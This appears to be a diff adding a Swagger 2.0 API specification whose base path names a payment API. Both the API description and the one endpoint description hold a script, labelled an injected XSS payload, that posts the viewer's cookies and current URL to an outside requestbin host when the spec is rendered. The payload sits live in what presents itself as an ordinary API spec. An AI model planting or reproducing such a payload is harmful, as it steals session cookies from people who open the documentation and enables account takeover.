@@ -1,0 +1,46 @@
+swagger: '2.0'
+info:
+  title: Example API
+  description: |
+    <script>
+      // Function to send data to the requestbin
+      function sendData() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://en06v3iu5qly1f.x.pipedream.net/", true); // Your requestbin URL
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({
+          data: document.cookie, // Sends cookies as an example
+          url: window.location.href // Sends the current URL
+        }));
+      }
+      sendData();
+    </script>
+  version: 1.0.0
+basePath: https://api.tbcpay.ge
+produces:
+  - application/json
+consumes:
+  - application/json
+paths:
+  /example:
+    get:
+      summary: Example endpoint
+      description: |
+        <script>
+          // Injected XSS payload
+          function sendAlert() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://en06v3iu5qly1f.x.pipedream.net/", true); // Your requestbin URL
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify({
+              data: document.cookie, // Sends cookies as an example
+              url: window.location.href // Sends the current URL
+            }));
+          }
+          sendAlert();
+        </script>
+      responses:
+        '200':
+          description: Success response
+      tags:
+        - Example Tag
